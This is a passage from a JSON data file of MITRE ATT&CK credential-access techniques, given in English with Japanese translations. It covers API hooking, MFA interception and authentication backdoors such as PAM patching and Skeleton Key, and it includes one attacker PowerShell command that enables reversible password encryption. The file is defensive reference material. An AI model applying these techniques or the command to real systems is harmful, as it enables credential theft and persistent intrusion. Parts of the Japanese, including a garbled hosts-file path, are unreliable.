                        "description_jp": "攻撃者は、Windowsアプリケーションプログラミングインターフェース(API)関数やLinuxシステム関数にフックして、ユーザー認証情報を収集する可能性があります。悪意のあるフッキングメカニズムは、ユーザー認証クレデンシャルを明らかにするパラメータを含むAPIまたは関数コールをキャプチャする可能性があります。(引用: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) [Keylogging](https://attack.mitre.org/techniques/T1056/001)とは異なり、このテクニックは、ユーザー認証クレデンシャルを明らかにするパラメータを含むAPI関数に特に焦点を当てています。\n\nWindowsでは、フッキングはこれらの関数への呼び出しをリダイレクトすることを含み、以下の方法で実装できる：\n\n* フックプロシージャ**は、メッセージ、キーストローク、マウス入力などのイベントに応答して、指定されたコードをインターセプトして実行する。(引用: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)\n* インポートされたAPI関数へのポインタが格納されているプロセスのIATへの変更を使用する(引用: Elastic Process Injection 2017年7月)(引用: Adlice Software IAT Hooks 2014年10月)(引用: MWRInfoSecurity Dynamic Hooking 2015年)\n* コードフローをリダイレクトするためにAPI関数の最初のバイトを上書きする**インラインフッキング**(引用: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n\nLinuxとmacOSでは、敵は`LD_PRELOAD`（Linux）または`DYLD_INSERT_LIBRARIES`（macOS）環境変数を介してシステム関数にフックする可能性がある。例えば、敵対者はSSHやSCPで活用される`libc read`関数にフックすることで、認証情報をキャプチャすることができる（引用：Intezer Symbiote 2022）。"
                    },
                    {
                        "id": "T1056.003",
                        "name_eng": "Web Portal Capture",
                        "name_jp": "ウェブポータル・キャプチャー",
                        "description_eng": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",
                        "description_jp": "攻撃者は、VPN ログインページのような外部に面したポータルにコードをインストールし、サービスにログインしようとするユーザの認証情報をキャプチャして送信する可能性があります。例えば、侵害されたログインページは、ユーザーをサービスにログインさせる前に、提供されたユーザー認証情報をログに記録する可能性があります。\n\nこの入力キャプチャのバリエーションは、[外部リモートサービス](https://attack.mitre.org/techniques/T1133) および [有効なアカウント](https://attack.mitre.org/techniques/T1078) を通じてネットワークアクセスを維持するためのバックアップ対策として、または外部向けウェブサービスを悪用した最初の侵害の一部として、正当な管理アクセスを使用して侵害後に実施される可能性があります。(引用：Volexity Virtual Private Keylogging)"
                    }
                ]
            },
            {
                "id": "T1111",
                "name_eng": "Multi-Factor Authentication Interception",
                "name_jp": "多要素認証による傍受",
                "description_eng": "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users’ phones.(Citation: Okta Scatter Swine 2022)",
                "description_jp": "攻撃者は、システム、サービス、およびネットワーク・リソースへのアクセスに使用できるクレデンシャルへのア クセスを得るために、多要素認証（MFA）メカニズム（スマートカード、トークン・ジェネレータなど）を標的にす る可能性がある。MFA の使用は推奨され、ユーザ名とパスワードだけよりも高いレベルのセキュリティを提供する が、組織は、これらのセキュリティ・メカニズムを傍受してバイパスするために使用される可能性のある技 術に注意する必要がある。\n\n多要素認証にスマート・カードを使用する場合、通常の使用中にスマート・カードに関連付けら れたパスワードを取得するには、キーロガーを使用する必要がある。挿入されたカードとスマート・カードのパスワードへのアクセスの両方があれば、敵対者は、感染したシステムを使用してネットワーク・リソースに接続し、挿入されたハードウェア・トークンによる認証をプロキシすることができる。(引用：Mandiant M Trends 2011）\n\n敵対者は、RSA SecurID などの他のハードウェア・トークンも同様にキーロガーを使用する可能性があります。トークンの入力（ユーザの個人識別コードを含む）をキャプチャすることで、一時的なアクセス（次 の値のロールオーバーまでワンタイムパスコードを再生すること）が可能になるだけでなく、敵対者が将来の認証 値を確実に予測できるようになる可能性があります（アルゴリズムと、追加された一時的なコードを生成す るために使用されるシード値の両方にアクセスできる場合）。(引用：GCN RSA June 2011）\n\nMFA の他の方法は、敵対者によって傍受され、認証に使用される可能性がある。ワンタイムコードは、帯域外の通信（電子メール、SMS）を介して送信されるのが一般的である。デバイスやサービスがセキュアでない場合、傍受されやすい。例えば、敵対者がユーザーの携帯電話に送信されたMFAコードを盗むために、SMSメッセージングサービスを侵害する可能性があります（引用：Okta Scatter Swine 2022）。",
                "subtechniques": []
            },
            {
                "id": "T1556",
                "name_eng": "Modify Authentication Process",
                "name_jp": "認証プロセスの変更",
                "description_eng": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
                "description_jp": "攻撃者は、認証メカニズムやプロセスを改ざんして、ユーザー認証情報にアクセスしたり、アカウントへの不当なアクセスを可能にしたりする可能性がある。認証プロセスは、Windows の Local Security Authentication Server (LSASS) プロセスや Security Accounts Manager (SAM)、Unix ベースのシステムの Pluggable Authentication Module (PAM)、MacOS システムの Authorization Plugins などのメカニズムによって処理され、認証情報の収集、保存、検証を行う。認証プロセスを変更することで、敵は[Valid Accounts](https://attack.mitre.org/techniques/T1078)を使わずにサービスやシステムを認証できるかもしれない。\n\n敵はこのプロセスの一部を悪意を持って変更し、クレデンシャルを明らかにするか、認証メカニズムをバイパスする。侵害された認証情報またはアクセスは、ネットワーク内のシステム上のさまざまなリソースに配置されたアクセス制御をバイパスするために使用される可能性があり、VPN、Outlook Web Access、リモートデスクトップなどのリモートシステムや外部で利用可能なサービスへの永続的なアクセスに使用される可能性さえある。",
                "subtechniques": [
                    {
                        "id": "T1556.004",
                        "name_eng": "Network Device Authentication",
                        "name_jp": "ネットワーク機器認証",
                        "description_eng": "Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\n\n[Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: Mandiant - Synful Knock)",
                        "description_jp": "攻撃者は、[Patch System Image](https://attack.mitre.org/techniques/T1601/001)を使用して、オペレーティングシステムにパスワードをハードコードし、ネットワークデバイス上のローカルアカウントのネイティブ認証メカニズムをバイパスする可能性がある。\n\n[システムイメージの修正](https://attack.mitre.org/techniques/T1601)は、ネットワークデバイスのオペレーティングシステムに、特定のパスワードを使用して敵にアクセスを提供するためのコードを埋め込む可能性があります。  この修正には、パッチを介してオペレーティングシステムイメージに埋め込まれる特定のパスワードが含まれます。  認証が試みられると、挿入されたコードはまずユーザー入力がパスワードかどうかをチェックする。もしそうなら、アクセスは許可される。そうでない場合、埋め込まれたコードは潜在的に有効な認証情報を検証するために認証情報を渡す。 引用：Mandiant - Synful Knock"
                    },
                    {
                        "id": "T1556.001",
                        "name_eng": "Domain Controller Authentication",
                        "name_jp": "ドメインコントローラ認証",
                        "description_eng": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. \n\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)",
                        "description_jp": "攻撃者は、ドメインコントローラの認証プロセスにパッチを当て、典型的な認証メカニズムをバイパスし、アカウントへのアクセスを可能にする可能性がある。\n\nマルウェアは、任意のユーザーのアカウントや認証情報にアクセスするためのバックドアを作成する目的で、ドメインコントローラの認証プロセスに偽の認証情報を注入するために使用される可能性があります（例：[Skeleton Key](https://attack.mitre.org/software/S0007)）。スケルトン・キーは、敵が標準認証システムをバイパスするために使用する可能性のある認証情報を使用して、エンタープライズ・ドメイン・コントローラの認証プロセス(LSASS)にパッチを適用することで機能する。いったんパッチが適用されると、敵対者は注入されたパスワードを使用して、（ドメインコントローラの再起動によってスケルトンキーがメモリから消去されるまで）ドメインユーザーアカウントとして認証に成功することができる。認証されたアクセスは、一要素認証環境内のホストおよび/またはリソースへの自由なアクセスを可能にする可能性がある(引用：Dell Skeleton)"
                    },
                    {
                        "id": "T1556.009",
                        "name_eng": "Conditional Access Policies",
                        "name_jp": "条件付きアクセス・ポリシー",
                        "description_eng": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                        "description_jp": "攻撃者は、条件付きアクセス・ポリシーを無効にしたり変更したりして、危殆化したア カウントへの永続的なアクセスを可能にすることがある。条件付きアクセス・ポリシーは、ID プロバイダおよび ID とアクセス管理システムによって使用 される追加の検証であり、リソースへのアクセスをユーザに許可すべきかどうかを決定する。\n\nたとえば、Entra ID、Okta、および JumpCloud では、IP アドレス、デバイスの登録状態、および多要素認証の使用に基づいて、ユー ザのアプリケーションへのアクセスを拒否することができる（引用：Microsoft Conditional Access）（引用：JumpCloud Conditional Access Policies）（引用：Okta Conditional Access Policies） 場合によっては、ID プロバイダは、さまざまな指標に基づいてサインインを拒否するリスクベースの測定 基準の使用もサポートしている。AWS と GCP では、IAM ポリシーに `condition` 属性を含めることができ、ソース IP、リクエストが行われた日付、リクエストされたリソースやリージョンの性質など、任意の制約を検証することができる（引用：AWS IAM Conditions）。\n\n信頼できる IP 範囲の追加、[多要素認証](https://attack.mitre.org/techniques/T1556/006) 要件の削除、[未使用/未サポートのクラウド領域](https://attack.mitre.org/techniques/T1535) の追加許可など、条件付きアクセスポリシーを変更することで、敵対者はアカウントへの永続的なアクセスを確保し、防御策を回避できる可能性がある。"
                    },
                    {
                        "id": "T1556.008",
                        "name_eng": "Network Provider DLL",
                        "name_jp": "ネットワークプロバイダDLL",
                        "description_eng": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.(Citation: Network Provider API) During the logon process, Winlogon (the interactive logon module) sends credentials to the local `mpnotify.exe` process via RPC. The `mpnotify.exe` process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.(Citation: NPPSPY - Huntress)(Citation: NPPSPY Video)(Citation: NPLogonNotify) \n\nAdversaries can configure a malicious network provider DLL to receive credentials from `mpnotify.exe`.(Citation: NPPSPY) Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the `NPLogonNotify()` function.(Citation: NPLogonNotify)\n\nAdversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.(Citation: NPPSPY - Huntress)",
                        "description_jp": "攻撃者は、悪意のあるネットワークプロバイダ・ダイナミックリンク・ライブラリ（DLL）を登録し、認証プロセス中に平文のユーザー認証情報を取得する可能性がある。ネットワークプロバイダーDLLは、Windowsが特定のネットワークプロトコルとインターフェースすることを可能にし、アドオンの資格情報管理機能をサポートすることもできる(引用: Network Provider API)。ログオンプロセス中、Winlogon(対話型ログオンモジュール)はRPCを介してローカルの`mpnotify.exe`プロセスに資格情報を送信する。その後、`mpnotify.exe`プロセスは、ログオンイベントが発生していることを通知する際に、登録されたクレデンシャルマネージャとクレデンシャルをクリアテキストで共有する。 引用：NPPSPY - Huntress）（引用：NPPSPYビデオ）（引用：NPLogonNotify\n\n(引用: NPPSPY) 悪意のあるネットワークプロバイダ DLL は、`mpnotify.exe` から認証情報を受け取るように設定できる。(引用: NPPSPY) 認証情報マネージャとして (レジストリを介して) インストールされると、悪意のある DLL は、`NPLogonNotify()` 関数を介して、ユーザーが Windows ワークステーションまたはドメインにログオンするたびに認証情報を受け取り、保存できる。\n\n攻撃者は、サーバーやドメインコントローラなど、ログオンアクティビティや管理者ログオンアクティビティが増加していることが知られているシステムに、悪意のあるネットワークプロバイダ DLL を植え付けることを標的にする可能性がある(引用：NPPSPY - Huntress)。"
                    },
                    {
                        "id": "T1556.002",
                        "name_eng": "Password Filter DLL",
                        "name_jp": "パスワードフィルタDLL",
                        "description_eng": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)",
                        "description_jp": "攻撃者は、悪意のあるパスワード・フィルタ・ダイナミック・リンク・ライブラリ（DLL）を認証プロセスに登録し、認証されたユーザー認証情報を取得する可能性がある。\n\nWindows パスワード・フィルタは、ドメイン・アカウントとローカル・アカウントの両方に対するパスワー ド・ポリシー強制メカニズムである。フィルタは、パスワードポリシーに照らして潜在的なパスワードを検証するメソッドを含む DLL として実装されます。フィルターDLLは、ローカルアカウントの場合はローカルコンピューター上に、 ドメインアカウントの場合はドメインコントローラー上に置くことができる。新しいパスワードをSecurity Accounts Manager (SAM)に登録する前に、Local Security Authority (LSA)は登録された各フィルタに検証を要求する。登録されたすべてのフィルターが検証を承認するまで、変更される可能性のある内容は有効にならない。\n\n攻撃者は、ローカルコンピュータやドメイン全体から認証情報を採取するために、悪意のあるパスワードフィルタを登録することができる。適切な検証を行うには、フィルタは LSA からプレーンテキストの認証情報を受け取らなければならない。悪意のあるパスワードフィルタは、パスワード要求が行われるたびに、これらのプレーンテキストの認証情報を受け取ることになる(引用：Carnal Ownage Password Filters Sept 2013)"
                    },
                    {
                        "id": "T1556.006",
                        "name_eng": "Multi-Factor Authentication",
                        "name_jp": "多要素認証",
                        "description_eng": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\n\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD Conditional Access Exclusions)\n\nFor example, modifying the Windows hosts file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. (Citation: Russians Exploit Default MFA Protocol - CISA March 2022) \n\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.(Citation: Russians Exploit Default MFA Protocol - CISA March 2022)",
                        "description_jp": "攻撃者は、侵害されたアカウントへの持続的なアクセスを可能にするために、多要素認証（MFA）メカニズムを無効にしたり、変更したりする可能性がある。\n\n敵対者は、MFA を欠くアカウントを侵害するか、[Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621) のような MFA バイパス手法を採用することでネットワークにアクセスできるようになると、そのアクセス権を活用して MFA 防御を変更したり、完全に無効にしたりする可能性があります。これは、Azure ADの条件付きアクセスポリシーからユーザーを除外する、新しいが脆弱である/敵に制御されたMFAメソッドを登録する、または期待される機能をバイパスするためにMFAプログラムや設定ファイルに手動でパッチを適用するなど、正当な機能を悪用することによって達成することができる。 引用：Mandiant APT42）（引用：Azure ADの条件付きアクセス除外について\n\n例えば、MFA 呼び出しを MFA サーバではなく localhost にリダイレクトするように、Windows の hosts ファイル（`C:∕windowssystem∕drivers∕drivers∕cachehosts`）を変更すると、MFA プロセスが失敗する可能性がある。フェイルオープン」ポリシーが設定されている場合、そうでなければ成功した認証の試みは、MFAを実施することなくアクセスが許可される可能性がある。(引用: ロシア人によるデフォルト MFA プロトコルの悪用 - CISA March 2022)\n\n敵対者の範囲、目的、権限によっては、MFA 防御が個々のアカウントに対して無効にされる場合もあれば、被害者のネットワーク環境内のすべてのドメインアカウントなど、より大きなグループに関連付けられたすべてのアカウントに対して無効にされる場合もある（引用：Russians Exploit Default MFA Protocol - CISA March 2022）。"
                    },
                    {
                        "id": "T1556.007",
                        "name_eng": "Hybrid Identity",
                        "name_jp": "ハイブリッド・アイデンティティ",
                        "description_eng": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra ID \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.(Citation: Mandiant Azure AD Backdoors)",
                        "description_jp": "攻撃者は、典型的な認証メカニズムを迂回し、クレデンシャルにアクセスし、アカウントへの永続的なアクセスを可能にするために、オンプレミス・ユーザ・アイデンティティに関連付けられたクラウド認証プロセスにパッチを当てたり、修正したり、その他の方法でバックドアを仕掛ける可能性がある。  \n\n多くの組織が、オンプレミスとクラウドベースの環境間で共有されるハイブリッド・ユーザ・ アイデンティティとハイブリッド・デバイス・アイデンティティを維持している。これらは様々な方法で維持することができる。例えば、Microsoft Entra IDには、Active DirectoryとEntra IDの間でIDを同期するための3つのオプションがある（引用：Azure AD Hybrid Identity）：\n\n* オンプレミスの特権アカウントが Active Directory と Entra ID の間でユーザーのパスワードハッシュを同期することで、Entra ID への認証が完全にクラウドで行われるようにする。\n* Entra IDの認証試行がオンプレミスのPTAエージェントに転送され、PTAエージェントがActive Directoryに対して認証情報を検証します。\n* Active DirectoryとEntra IDの間に信頼関係が確立される。\n\nAD FSは、AWSやGCPなどの他のSaaSやクラウドプラットフォームでも使用することができ、認証プロセスをAD FSに渡し、ハイブリッドユーザーのIDと権限を含むトークンを受け取る。\n\nハイブリッド・アイデンティティに関連付けられた認証プロセスを変更することで、敵対者はクラウド・リソースへの永続的な特権アクセスを確立できる可能性があります。たとえば、PTA エージェントを実行しているオンプレミスのサーバーを侵害する敵対者は、Entra ID への認証のすべての試みを承認し、ユーザー資格情報を記録する `AzureADConnectAuthenticationAgentService` プロセスに悪意のある DLL を注入することができます。(引用: Azure AD Connect for Read Teamers)(引用: AADInternals Azure AD On-Prem to Cloud) AD FSを使用する環境では、敵対者が`Microsoft.IdentityServer.Servicehost`構成ファイルを編集して悪意のあるDLLをロードする可能性がある。\n\n場合によっては、敵対者はクラウドからハイブリッド ID 認証プロセスを変更することができる。たとえば、Entra ID テナントのグローバル管理者アカウントを侵害した敵対者は、Web コンソールを介して新しい PTA エージェントを登録できる可能性があり、同様に認証情報を採取して任意のユーザーとして Entra ID 環境にログインできるようになります（引用：Mandiant Azure AD Backdoors）。"
                    },
                    {
                        "id": "T1556.005",
                        "name_eng": "Reversible Encryption",
                        "name_jp": "可逆暗号化",
                        "description_eng": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)\n\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\n\n1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>\n2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>\n3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)\n4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)\n\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)\n\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.",
                        "description_jp": "敵対者は、Active Directory 認証の暗号化プロパティを悪用して、Windows システム上の資格情報にアクセスする可能性がある。<code>AllowReversiblePasswordEncryption</code> プロパティは、アカウントの可逆パスワード暗号化を有効にするか無効にするかを指定します。デフォルトでは、このプロパティは無効になっており（代わりに一方向ハッシュ関数の出力としてユーザー認証情報を格納する）、レガシーや他のソフトウェアがそれを必要としない限り、有効にすべきではありません。\n\nこのプロパティが有効になっている場合、および/または有効になっている後にユーザーがパスワードを変更した場合、敵対者はプロパティが有効になってから作成/変更されたパスワードの平文を取得できる可能性があります。パスワードを解読するために、敵は4つのコンポーネントを必要とする：\n\n1.Active Directoryのユーザー構造<code>userParameters</code>から暗号化されたパスワード(<code>G$RADIUSCHAP</code>)。\n2.同じく<code>userParameters</code>から16バイトのランダムに生成された値(<code>G$RADIUSCHAPKEY</code>)\n3.グローバルLSAシークレット (<code>G$MSRADIUSCHAPKEY</code>)\n4.リモートアクセス下位認証DLLにハードコードされた静的キー (<code>RASSFM.DLL</code>)\n\nこの情報があれば、敵は暗号化キーを複製し、暗号化されたパスワード値を復号化できる可能性がある(引用：how_pwd_rev_enc_1)(引用：how_pwd_rev_enc_2)\n\n敵対者は、ローカルグループポリシーエディタ、ユーザープロパティ、FGPP(Fine-Grained Password Policy)、または ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) モジュールを通して、様々なスコープでこのプロパティを設定することができる。(引用: dump_pwd_dcsync) PowerShellでは、敵は<code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>のようなコマンドを使用して、ユーザー設定に関連する変更を行うことができます。"
                    },
                    {
                        "id": "T1556.003",
                        "name_eng": "Pluggable Authentication Modules",
                        "name_jp": "プラガブル認証モジュール",
                        "description_eng": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                        "description_jp": "攻撃者は、pluggable authentication modules (PAM)を改変して、ユーザ認証情報にアクセスしたり、アカウントへの不当なアクセスを可能にしたりする可能性がある。PAM は、設定ファイル、ライブラリ、実行ファイルからなるモジュール・システムであり、 多くのサービスの認証を誘導する。最も一般的な認証モジュールは <code>pam_unix.so</code> であり、<code>/etc/passwd</code> と <code>/etc/shadow</code> にあるアカウント認証情報を取得、設定、検証する。(引用: Apple PAM) (引用: Man Pam_Unix) (引用: Red Hat PAM)\n\n攻撃者はバックドアを作成するためにPAMシステムのコンポーネントを変更することができる。<code>pam_unix.so</code> のような PAM コンポーネントは、任意の敵が提供した値を正当な認証情報として受け入れるようにパッチを当てることができる。\n\nPAM システムに対する悪意のある変更も、クレデンシャルを盗むために悪用される可能性がある。PAM はパスワードを保存しないため、PAM コンポーネントと交換される値はプレーンテキストである可能性がある。(引用：PAM Creds)(引用：Apple PAM)"
                    }
                ]
            }
        ]
    },
    {
        "id": "TA0002",
        "name_eng": "Execution",
        "name_jp": "実行",
        "description_eng": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.",
        "description_jp": "敵は悪意のあるコードを実行しようとしている。\n\n実行は、敵が制御するコードがローカルまたはリモートのシステム上で実行されることになる技術で構成されます。悪意のあるコードを実行するテクニックは、ネットワークの探索やデータの窃取など、より広範な目標を達成するために、他のすべての戦術のテクニックと組み合わされることがよくあります。例えば、敵はリモートアクセスツールを使用して、リモートシステムディスカバリを実行するPowerShellスクリプトを実行するかもしれません。",
        "techniques": [
            {
                "id": "T1047",
                "name_eng": "Windows Management Instrumentation",
                "name_jp": "Windows管理インストルメンテーション",
